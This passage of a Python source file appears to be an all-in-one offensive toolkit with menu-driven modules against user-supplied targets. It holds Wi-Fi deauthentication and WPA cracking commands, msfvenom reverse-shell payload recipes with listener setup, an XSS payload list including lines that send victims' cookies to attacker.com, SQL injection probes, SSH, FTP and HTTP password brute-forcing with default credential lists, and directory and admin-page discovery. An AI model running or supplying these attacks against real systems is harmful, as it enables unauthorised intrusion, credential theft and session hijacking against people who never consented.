        client = input(f"{SG}[+] Client MAC (Enter for broadcast): {SR}")
        count = input(f"{SG}[+] Packet count (Enter=100): {SR}") or "100"
        cmd = ["sudo", "aireplay-ng", "--deauth", count, "-a", bssid]
        if client:
            cmd.extend(["-c", client])
        cmd.append("wlan0mon")
        subprocess.run(cmd)
    elif choice == "4":
        cap_file = input(f"{SG}[+] Capture file (.cap): {SR}")
        wordlist = input(f"{SG}[+] Wordlist (Enter=/usr/share/wordlists/rockyou.txt): {SR}") or "/usr/share/wordlists/rockyou.txt"
        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])
    elif choice == "5":
        subprocess.run(["sudo", "wifite"])
    pause()

def metasploit_helper():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║         METASPLOIT HELPER TOOL           ║
    ╚═══════════════════════════════════════════╝{SR}
""")
    print(f"{SY}[!] Useful Metasploit Commands:{SR}")
    print(f"  {SC}msfconsole - Launch Metasploit{SR}")
    print(f"  {SC}msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] -o [output]{SR}")
    print(f"\n{SY}[!] Common Payloads:{SR}")
    print(f"  {SC}linux/x64/shell_reverse_tcp{SR}")
    print(f"  {SC}windows/x64/meterpreter/reverse_tcp{SR}")
    print(f"  {SC}android/meterpreter/reverse_tcp{SR}")
    print(f"  {SC}php/meterpreter_reverse_tcp{SR}")
    print(f"  {SC}python/meterpreter/reverse_tcp{SR}")
    print(f"\n{SY}[!] Example:{SR}")
    print(f"  {SC}msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf{SR}")
    print(f"\n{SY}[!] Listener Setup:{SR}")
    print(f"  {SC}use exploit/multi/handler{SR}")
    print(f"  {SC}set PAYLOAD linux/x64/shell_reverse_tcp{SR}")
    print(f"  {SC}set LHOST 0.0.0.0{SR}")
    print(f"  {SC}set LPORT 4444{SR}")
    print(f"  {SC}exploit{SR}")
    pause()

class XSSInjector:
    def __init__(self):
        self.name = "XSS INJECTION ENGINE"
        self.payloads = []
        self.init_payloads()

    def init_payloads(self):
        self.payloads = [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\" onmouseover=alert(1) \"",
            "' onclick=alert(1) '",
            "';alert(1);//",
            "<script>document.location='https://attacker.com/steal.php?c='+document.cookie</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<IMG SRC=javascript:alert(1)>",
            "<div onmouseover=\"alert(1)\">Hover me</div>",
            "<a href=javascript:alert(1)>Click</a>",
            "<script>fetch('https://attacker.com/',{method:'POST',body:document.cookie})</script>",
        ]

    def test_reflected(self, url, param):
        print(f"\n{SC}[*] Testing Reflected XSS on parameter: {param}{SR}")
        results = []
        total = len(self.payloads)

        for i, payload in enumerate(self.payloads):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] if isinstance(v, list) else v for k, v in test_params.items()})).geturl()

            try:
                r = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=3, verify=False)
                if payload in r.text or payload.lower() in r.text:
                    print(f"    {R}[!] XSS DETECTED! Payload #{i+1}: {payload[:60]}...{SR}")
                    results.append({"payload": payload, "url": test_url})
                    if len(results) >= 5:
                        break
            except:
                pass

            progress_bar(i+1, total, prefix=f"{SC}Testing XSS payloads{SR}")
            time.sleep(0.01)

        print()
        if results:
            print(f"\n{R}[!] {len(results)} working XSS payloads found!{SR}")
        else:
            print(f"\n{SY}[-] No XSS detected with current payloads{SR}")
        return results

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║        XSS INJECTION ENGINE              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        url = input(f"{SG}[+] Target URL (with parameters): {SR}")
        param = input(f"{SG}[+] Parameter to test: {SR}")
        results = self.test_reflected(url, param)
        pause()

class SQLInjector:
    def __init__(self):
        self.name = "SQL INJECTION ENGINE"
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "admin' --",
            "' OR 1=1 --",
            "\" OR \"1\"=\"1",
            "\" AND 1=1 --",
            "1' ORDER BY 1 --",
            "1' ORDER BY 2 --",
            "' UNION SELECT @@version,2,3 --",
            "' UNION SELECT database(),2,3 --",
            "' UNION SELECT user(),2,3 --",
            "1 AND SLEEP(5) --",
            "' AND SLEEP(5) --",
            "'; WAITFOR DELAY '0:0:5' --",
            "' OR pg_sleep(5) --",
        ]

    def test_injection(self, url, param):
        print(f"\n{SC}[*] Testing SQL Injection on parameter: {param}{SR}")
        results = []
        total = len(self.payloads)

        for i, payload in enumerate(self.payloads):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] if isinstance(v, list) else v for k, v in test_params.items()})).geturl()

            try:
                start_time = time.time()
                r = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=10, verify=False)
                elapsed = time.time() - start_time
                indicators = ["sql", "mysql", "syntax error", "unclosed", "quotation mark", "you have an error", 
                              "warning: mysql", "odbc", "driver", "mysql_fetch", "pg_query", "sqlite", "oracle"]
                response_lower = r.text.lower()
                vulnerable = any(indicator in response_lower for indicator in indicators)

                if "sleep" in payload.lower() and elapsed > 4:
                    print(f"    {R}[!] TIME-BASED SQLi DETECTED! Payload #{i+1}: {payload[:60]}...{SR}")
                    results.append({"payload": payload, "url": test_url, "type": "time-based"})
                elif vulnerable:
                    print(f"    {R}[!] SQLi DETECTED! Payload #{i+1}: {payload[:60]}...{SR}")
                    results.append({"payload": payload, "url": test_url, "type": "error-based"})

                if len(results) >= 5:
                    break
            except:
                pass

            progress_bar(i+1, total, prefix=f"{SC}Testing SQLi payloads{SR}")
            time.sleep(0.01)

        print()
        if results:
            print(f"\n{R}[!] {len(results)} working SQLi payloads found!{SR}")
        else:
            print(f"\n{SY}[-] No SQLi detected with current payloads{SR}")
        return results

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║        SQL INJECTION ENGINE              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        url = input(f"{SG}[+] Target URL (with parameters): {SR}")
        param = input(f"{SG}[+] Parameter to test: {SR}")
        results = self.test_injection(url, param)
        pause()

class BruteForceEngine:
    def __init__(self):
        self.name = "BRUTE FORCE ENGINE"

    def load_wordlists(self):
        usernames = ["admin", "root", "user", "test", "guest", "info", "adm", "mysql", "postgres", "pi", "ubuntu", "debian", "oracle", "sa", "administrator", "manager", "demo", "support", "webmaster", "backup", "ftp", "nobody", "nagios", "tomcat", "jboss", "wildfly", "jenkins", "gitlab"]
        passwords = ["admin", "root", "123456", "password", "admin123", "root123", "toor", "Password", "password123", "admin1234", "1234", "letmein", "welcome", "monkey", "dragon", "master", "sunshine", "princess", "qwerty", "111111", "123123", "password1", "administrator", "passw0rd", "P@ssw0rd", "changeme", "test", "test123", "guest", "temp", "temp123", "admin2024", "root2024", "server", "secret", "P@ssword", "default", "cisco", "cisco123", "router", "admin12345", "manager", "backup", "support", "123456789", "12345678", "pass123", "Pa$$w0rd", "p@ssw0rd", "Admin123", "Root123"]
        return usernames, passwords

    def ssh_bruteforce(self, target, port=22, username=None):
        print(f"\n{SC}[*] SSH Brute Force on {target}:{port}{SR}")
        try:
            import paramiko
            usernames, passwords = self.load_wordlists()
            if username:
                usernames = [username]
            for user in usernames:
                for pwd in passwords[:10]:
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(target, port=port, username=user, password=pwd, timeout=5)
                        print(f"    {SG}[+] SUCCESS: {user}:{pwd}{SR}")
                        client.close()
                        return {"username": user, "password": pwd}
                    except paramiko.AuthenticationException:
                        print(f"    {SY}[-] Failed: {user}:{pwd}{SR}")
                    except:
                        print(f"    {R}[-] Connection error: {user}:{pwd}{SR}")
            print(f"    {SY}[-] No credentials found{SR}")
            return None
        except ImportError:
            print(f"    {R}[-] 'paramiko' module required. Install with: pip install paramiko{SR}")
            return None

    def ftp_bruteforce(self, target, port=21, username=None):
        import ftplib
        print(f"\n{SC}[*] FTP Brute Force on {target}:{port}{SR}")
        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:10]:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(user, pwd)
                    print(f"    {SG}[+] SUCCESS: {user}:{pwd}{SR}")
                    ftp.quit()
                    return {"username": user, "password": pwd}
                except:
                    print(f"    {SY}[-] Failed: {user}:{pwd}{SR}")
        print(f"    {SY}[-] No credentials found{SR}")
        return None

    def web_auth_bruteforce(self, target, username=None):
        print(f"\n{SC}[*] HTTP Auth Brute Force on {target}{SR}")
        usernames, passwords = self.load_wordlists()
        if username:
            usernames = [username]
        for user in usernames:
            for pwd in passwords[:10]:
                try:
                    r = requests.get(target, auth=(user, pwd), timeout=5, verify=False)
                    if r.status_code == 200:
                        print(f"    {SG}[+] SUCCESS: {user}:{pwd}{SR}")
                        return {"username": user, "password": pwd}
                    elif r.status_code == 403:
                        print(f"    {SY}[-] {user}:{pwd} -> 403 (Authenticated but forbidden){SR}")
                    else:
                        print(f"    {SY}[-] Failed: {user}:{pwd}{SR}")
                except:
                    print(f"    {R}[-] Connection error: {user}:{pwd}{SR}")
        print(f"    {SY}[-] No credentials found{SR}")
        return None

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SM}
    ╔═══════════════════════════════════════════╗
    ║        BRUTE FORCE ENGINE                ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Brute Force Modules:{SR}")
        print(f"  {SC}[1]{SR} SSH Brute Force")
        print(f"  {SC}[2]{SR} FTP Brute Force")
        print(f"  {SC}[3]{SR} HTTP Basic Auth Brute Force")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice in ["1", "2", "3"]:
            target = input(f"{SG}[+] Target IP or URL: {SR}")
            if choice in ["1", "2"]:
                port = int(input(f"{SG}[+] Port: {SR}") or ("22" if choice == "1" else "21"))
            username = input(f"{SG}[+] Specific Username (Enter for list): {SR}") or None
            if choice == "1":
                self.ssh_bruteforce(target, port, username)
            elif choice == "2":
                self.ftp_bruteforce(target, port, username)
            elif choice == "3":
                self.web_auth_bruteforce(target, username)
        pause()

class VulnScanner:
    def __init__(self, name):
        self.name = name

    def check_headers(self, url):
        print(f"\n{SC}[*] Checking Security Headers on {url}{SR}")
        try:
            r = requests.get(url, headers={"User-Agent": random_ua()}, timeout=5, verify=False)
            headers = r.headers
            missing = []
            if 'Content-Security-Policy' not in headers:
                missing.append("Content-Security-Policy")
            if 'X-Content-Type-Options' not in headers:
                missing.append("X-Content-Type-Options")
            if 'X-Frame-Options' not in headers:
                missing.append("X-Frame-Options")
            if 'Strict-Transport-Security' not in headers:
                missing.append("Strict-Transport-Security")
            if missing:
                print(f"    {R}[!] Missing security headers: {', '.join(missing)}{SR}")
            else:
                print(f"    {SG}[+] All major security headers present{SR}")
            return missing
        except:
            print(f"    {R}[-] Could not retrieve headers{SR}")
            return []

    def check_ssl(self, url):
        print(f"\n{SC}[*] Checking SSL/TLS on {url}{SR}")
        try:
            parsed = urlparse(url)
            if parsed.scheme != 'https':
                print(f"    {R}[!] No HTTPS detected{SR}")
                return False
            host = parsed.netloc.split(':')[0]
            port = parsed.port if parsed.port else 443
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    print(f"    {SG}[+] SSL/TLS active. Cert issuer: {cert.get('issuer', 'N/A')}{SR}")
                    return True
        except:
            print(f"    {R}[!] SSL/TLS issues detected{SR}")
            return False

    def check_vulnerabilities(self, url):
        print(f"\n{SC}[*] Checking Common Vulnerabilities on {url}{SR}")
        vulnerable_paths = ["/admin", "/login", "/config", "/backup", "/phpinfo.php", "/.env", "/wp-config.php"]
        results = []
        for path in vulnerable_paths:
            test_url = urljoin(url, path)
            try:
                r = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=3, verify=False)
                if r.status_code == 200:
                    print(f"    {R}[!] Exposed endpoint: {test_url} (Status: {r.status_code}){SR}")
                    results.append(test_url)
            except:
                pass
        if not results:
            print(f"    {SG}[+] No common vulnerabilities found in tested paths{SR}")
        return results

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SY}
    ╔═══════════════════════════════════════════╗
    ║        VULNERABILITY SCANNER             ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        url = input(f"{SG}[+] Target URL: {SR}")
        self.check_headers(url)
        self.check_ssl(url)
        self.check_vulnerabilities(url)
        pause()

class NetworkScanner:
    def __init__(self):
        self.name = "NETWORK SCANNER"

    def ping_sweep(self, subnet):
        print(f"\n{SC}[*] Ping Sweep on {subnet}.0/24{SR}")
        hosts = []
        base = ".".join(subnet.split(".")[:3])
        total = 254
        for i in range(1, 255):
            ip = f"{base}.{i}"
            try:
                result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, timeout=2)
                if result.returncode == 0:
                    print(f"    {SG}[+] {ip} - ACTIVE{SR}")
                    hosts.append(ip)
            except:
                pass
            progress_bar(i, total, prefix=f"{SC}Scanning IPs{SR}")
        print()
        return hosts

    def port_scanner(self, target, ports=None):
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 27017]
        print(f"\n{SC}[*] Port Scan on {target}{SR}")
        open_ports = []
        total = len(ports)
        for i, port in enumerate(ports):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    try:
                        sock.send(b"HELP\r\n" if port in [21, 23] else b"\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    except:
                        banner = "No banner"
                    print(f"    {SG}[+] Port {port} OPEN - {self.guess_service(port)} - {banner[:50]}{SR}")
                    open_ports.append({"port": port, "service": self.guess_service(port), "banner": banner[:100]})
                sock.close()
            except:
                pass
            progress_bar(i+1, total, prefix=f"{SC}Scanning Ports{SR}")
        print()
        return open_ports

    def guess_service(self, port):
        services = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 9000: "Custom", 27017: "MongoDB"}
        return services.get(port, "Unknown")

    def os_fingerprint(self, target):
        print(f"\n{SC}[*] OS Fingerprinting on {target}{SR}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, 80))
            result = subprocess.run(["ping", "-c", "1", "-W", "2", target], capture_output=True, text=True)
            if "ttl=" in result.stdout.lower() or "ttl=" in result.stderr.lower():
                output = result.stdout + result.stderr
                ttl_match = re.search(r'[Tt][Tt][Ll]=(\d+)', output)
                if ttl_match:
                    ttl = int(ttl_match.group(1))
                    if ttl <= 64:
                        os_guess = "Linux/Unix/MacOS"
                    elif ttl <= 128:
                        os_guess = "Windows"
                    else:
                        os_guess = "Android/Cisco/BSD"
                    print(f"    {SG}[+] TTL: {ttl} - Likely OS: {os_guess}{SR}")
                    return os_guess
            sock.close()
        except:
            print(f"    {R}[-] Unable to determine OS{SR}")
        return "Unknown"

    def dns_enum(self, domain):
        print(f"\n{SC}[*] DNS Enumeration for {domain}{SR}")
        records = {}
        try:
            ip = socket.gethostbyname(domain)
            records["A"] = ip
            print(f"    {SG}[+] A record: {domain} -> {ip}{SR}")
        except:
            print(f"    {SY}[-] No A record{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            records["MX"] = [str(rdata.exchange) for rdata in answers]
            for mx in records["MX"]:
                print(f"    {SG}[+] MX: {mx}{SR}")
        except:
            print(f"    {SY}[-] No MX records{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'NS')
            records["NS"] = [str(rdata) for rdata in answers]
            for ns in records["NS"]:
                print(f"    {SG}[+] NS: {ns}{SR}")
        except:
            print(f"    {SY}[-] No NS records{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            records["TXT"] = [str(rdata) for rdata in answers]
            for txt in records["TXT"]:
                print(f"    {SG}[+] TXT: {txt[:80]}{SR}")
        except:
            print(f"    {SY}[-] No TXT records{SR}")
        if input(f"    {SG}[+] Scan subdomains? (y/N): {SR}").lower() == 'y':
            subdomains = ["www", "mail", "ftp", "admin", "blog", "shop", "api", "dev", "test", "webmail", "cpanel", "ns1", "ns2", "mx", "smtp", "pop", "imap", "vpn", "remote", "gitlab", "jenkins", "jira", "confluence"]
            print(f"    {SC}[*] Searching subdomains...{SR}")
            for sub in subdomains:
                subdomain = f"{sub}.{domain}"
                try:
                    ip = socket.gethostbyname(subdomain)
                    print(f"    {SG}[+] {subdomain} -> {ip}{SR}")
                    records[subdomain] = ip
                except:
                    pass
        return records

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SB}
    ╔═══════════════════════════════════════════╗
    ║          NETWORK SCANNER TOOL            ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Network Scanner Modules:{SR}")
        print(f"  {SC}[1]{SR} Ping Sweep")
        print(f"  {SC}[2]{SR} Port Scan")
        print(f"  {SC}[3]{SR} OS Fingerprint")
        print(f"  {SC}[4]{SR} DNS Enumeration")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            subnet = input(f"{SG}[+] Subnet (e.g., 192.168.1): {SR}")
            self.ping_sweep(subnet)
        elif choice == "2":
            target = input(f"{SG}[+] Target IP or Domain: {SR}")
            ports_input = input(f"{SG}[+] Ports (comma-separated, or 'default'): {SR}")
            if ports_input.lower() == 'default':
                self.port_scanner(target)
            else:
                ports = [int(p.strip()) for p in ports_input.split(",")]
                self.port_scanner(target, ports)
        elif choice == "3":
            target = input(f"{SG}[+] Target IP or Domain: {SR}")
            self.os_fingerprint(target)
        elif choice == "4":
            domain = input(f"{SG}[+] Domain: {SR}")
            self.dns_enum(domain)
        pause()

class CryptoModule:
    def __init__(self):
        self.name = "CRYPTO & ENCODING"

    def encode(self, text):
        print(f"\n{SC}[*] Encoding: {text}{SR}")
        print(f"  {SG}Base64: {base64.b64encode(text.encode()).decode()}{SR}")
        print(f"  {SG}Base32: {base64.b32encode(text.encode()).decode()}{SR}")
        print(f"  {SG}Base16 (Hex): {text.encode().hex()}{SR}")
        print(f"  {SG}Hex Reversed: {text[::-1].encode().hex()}{SR}")
        from urllib.parse import quote
        print(f"  {SG}URL Encoded: {quote(text)}{SR}")
        print(f"  {SG}Binary: {' '.join(format(ord(c), '08b') for c in text)}{SR}")
        def rot13(s):
            result = []
            for c in s:
                if 'a' <= c <= 'z':
                    result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= c <= 'Z':
                    result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(c)
            return ''.join(result)
        print(f"  {SG}ROT13: {rot13(text)}{SR}")

    def hash_string(self, text):
        print(f"\n{SC}[*] Hashing: {text}{SR}")
        print(f"  {SG}MD5: {hashlib.md5(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA1: {hashlib.sha1(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA256: {hashlib.sha256(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA512: {hashlib.sha512(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA3-256: {hashlib.sha3_256(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}BLAKE2b: {hashlib.blake2b(text.encode()).hexdigest()}{SR}")
        import hashlib
        ntlm = hashlib.new('md4', text.encode('utf-16le')).hexdigest()
        print(f"  {SG}NTLM: {ntlm}{SR}")

    def hash_identifier(self, hash_value):
        print(f"\n{SC}[*] Analyzing Hash: {hash_value}{SR}")
        length = len(hash_value)
        print(f"    {SY}Length: {length} characters{SR}")
        hash_types = []
        if length == 32 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            hash_types.append("MD5, MD4, MD2, LM, NTLM")
        if length == 40 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            hash_types.append("SHA1, SHA1(MySQL), MySQL5")
        if length == 56 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            hash_types.append("SHA224, SHA3-224")
        if length == 64 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            hash_types.append("SHA256, SHA3-256")
        if length == 96 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            hash_types.append("SHA384, SHA3-384")
        if length == 128 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            hash_types.append("SHA512, SHA3-512")
        if hash_value.startswith("$2b$") or hash_value.startswith("$2a$") or hash_value.startswith("$2y$"):
            hash_types.append("Bcrypt")
        if hash_value.startswith("$6$"):
            hash_types.append("SHA-512 (Unix)")
        if hash_value.startswith("$5$"):
            hash_types.append("SHA-256 (Unix)")
        if hash_value.startswith("$1$"):
            hash_types.append("MD5 (Unix)")
        if hash_types:
            for h in hash_types:
                print(f"    {SG}[+] Possible: {h}{SR}")
        else:
            print(f"    {SY}[-] Hash type not recognized{SR}")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SY}
    ╔═══════════════════════════════════════════╗
    ║        CRYPTO & ENCODING TOOL            ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Crypto Modules:{SR}")
        print(f"  {SC}[1]{SR} Encode Text")
        print(f"  {SC}[2]{SR} Hash Text")
        print(f"  {SC}[3]{SR} Identify Hash")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            text = input(f"{SG}[+] Text to encode: {SR}")
            self.encode(text)
        elif choice == "2":
            text = input(f"{SG}[+] Text to hash: {SR}")
            self.hash_string(text)
        elif choice == "3":
            hash_value = input(f"{SG}[+] Hash to identify: {SR}")
            self.hash_identifier(hash_value)
        pause()

class AIChatbot:
    def __init__(self):
        self.name = "AI CHATBOT"

    def offline_response(self, query):
        print(f"\n{SC}[*] Offline AI Response for: {query[:50]}{SR}")
        responses = {
            "web security": "Web security involves protecting websites from threats like XSS, SQLi, and CSRF. Ensure input validation, use HTTPS, and apply security headers like CSP and X-Frame-Options.",
            "network security": "Network security protects data during transmission. Use firewalls, IDS/IPS, VPNs, and strong encryption protocols like TLS. Monitor traffic for anomalies.",
            "password cracking": "Password cracking in ethical hacking tests credential strength. Use tools like Hashcat or Hydra with permission. Mitigate by enforcing strong password policies and multi-factor authentication.",
            "phishing": "Phishing tricks users into revealing data via fake emails or sites. Defend with email filters, user training, and DMARC. Test with authorized frameworks like SET or Zphisher.",
            "malware": "Malware is malicious software (viruses, trojans, ransomware). Use antivirus, keep systems updated, and avoid untrusted downloads. Analyze in isolated environments like sandboxes.",
            "sql injection": "SQL injection manipulates database queries. Prevent with prepared statements, ORM, and input sanitization. Test URLs and forms for vulnerabilities with payloads like ' OR '1'='1.",
            "xss": "Cross-site scripting (XSS) injects scripts into web pages. Prevent with CSP, output encoding, and input validation. Test parameters with payloads like <script>alert(1)</script>.",
            "brute force": "Brute force attacks guess passwords. Mitigate with account lockouts, CAPTCHAs, and strong passwords. Test with tools like Hydra under authorized conditions.",
            "ddos": "DDoS overwhelms targets with traffic. Mitigate with rate limiting, CDNs, and redundancy. Test resilience with authorized stress tools, ensuring legal compliance.",
            "pentest": "Penetration testing identifies vulnerabilities by simulating attacks. Follow methodologies like OWASP, OSSTMM. Use tools like Metasploit, Nmap, and Burp Suite with explicit permission."
        }
        query_lower = query.lower()
        for key, value in responses.items():
            if key in query_lower:
                print(f"    {SG}[+] {value}{SR}")
                return value
        print(f"    {SY}[-] No relevant response found. Try specific keywords like 'XSS' or 'DDoS'.{SR}")
        return "No relevant response"

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║           AI CHATBOT ENGINE              ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] AI Chatbot (Offline Mode):{SR}")
        query = input(f"{SG}[+] Ask about cybersecurity (e.g., XSS, DDoS): {SR}")
        self.offline_response(query)
        pause()

class WebHackingSuite:
    def __init__(self):
        self.name = "WEB HACKING SUITE"

    def directory_buster(self, url, wordlist=None):
        if wordlist is None:
            wordlist = ["admin", "login", "wp-admin", "administrator", "backup", "config", "db", "phpmyadmin", "panel", "cpanel", "uploads", "files", "images", "css", "js", "api", "v1", "test", "dev", "secret", "robots.txt", ".env", "sitemap.xml", "index.php", "index.html", "config.php", "config.json", "database.yml", "settings", "wp-content", "wp-includes", "vendor", "node_modules", ".git", ".svn", ".htaccess", "server-status", "info.php", "shell.php", "cmd.php", "upload.php", "download.php", "backup.zip", "backup.sql", "dump.sql", "admin.php"]
        print(f"\n{SC}[*] Directory Busting on {url}{SR}")
        found = []
        total = len(wordlist)
        for i, path in enumerate(wordlist):
            test_url = url.rstrip("/") + "/" + path.lstrip("/")
            try:
                r = requests.get(test_url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code == 200:
                    print(f"    {SG}[+] {test_url} -> {r.status_code} ({len(r.content)} bytes){SR}")
                    found.append({"url": test_url, "status": r.status_code, "size": len(r.content)})
                elif r.status_code in [301, 302, 307, 308]:
                    print(f"    {SY}[→] {test_url} -> {r.status_code} -> {r.headers.get('Location', 'N/A')}{SR}")
                    found.append({"url": test_url, "status": r.status_code, "redirect": r.headers.get('Location', '')})
                elif r.status_code == 403:
                    print(f"    {R}[!] {test_url} -> {r.status_code} (Forbidden){SR}")
                elif r.status_code == 401:
                    print(f"    {SG}[+] {test_url} -> {r.status_code} (Authentication required){SR}")
            except:
                pass
            progress_bar(i+1, total, prefix=f"{SC}Testing Paths{SR}")
        print()
        return found

    def admin_finder(self, url):
        print(f"\n{SC}[*] Admin Page Finder on {url}{SR}")
        admin_paths = ["admin", "administrator", "login", "wp-admin", "panel", "cpanel", "admin/login", "admin/index", "admin/panel", "adminarea", "adminpanel", "dashboard", "moderator", "backend", "adm", "siteadmin", "admin/login.php", "admin/index.php", "gestion", "administration", "login.php", "user/login", "auth/login", "signin", "connexion", "member/login", "members", "account/login", "secure"]
        found = []
        total = len(admin_paths)
        for i, path in enumerate(admin_paths):
            test_url = url.rstrip("/") + "/" + path
            try:
                r = requests.get(test_url, timeout=5, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403]:
                    print(f"    {SG}[+] {test_url} -> {r.status_code}{SR}")
                    found.append({"url": test_url, "status": r.status_code})
            except:
                pass
            progress_bar(i+1, total, prefix=f"{SC}Testing Admin Paths{SR}")
        print()
        return found

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║          WEB HACKING SUITE               ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] Web Hacking Modules:{SR}")
        print(f"  {SC}[1]{SR} Directory Buster")
        print(f"  {SC}[2]{SR} Admin Page Finder")
        print(f"  {SC}[3]{SR} XSS Test")
        print(f"  {SC}[4]{SR} SQL Injection Test")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        url = input(f"{SG}[+] Target URL: {SR}")
        if choice == "1":
            self.directory_buster(url)
        elif choice == "2":
            self.admin_finder(url)
        elif choice == "3":
            param = input(f"{SG}[+] Parameter to test: {SR}")
            XSSInjector().test_reflected(url, param)
        elif choice == "4":
            param = input(f"{SG}[+] Parameter to test: {SR}")
            SQLInjector().test_injection(url, param)
        pause()

if __name__ == "__main__":
    check_dependencies()
    typing(f"{SG}[+] ALL MODULES LOADED SUCCESSFULLY{SR}", 0.03)
    typing(f"{SG}[+] TOOLKIT v5.0 READY - 18 MODULES AVAILABLE{SR}", 0.03)
    time.sleep(1)
    main_menu()
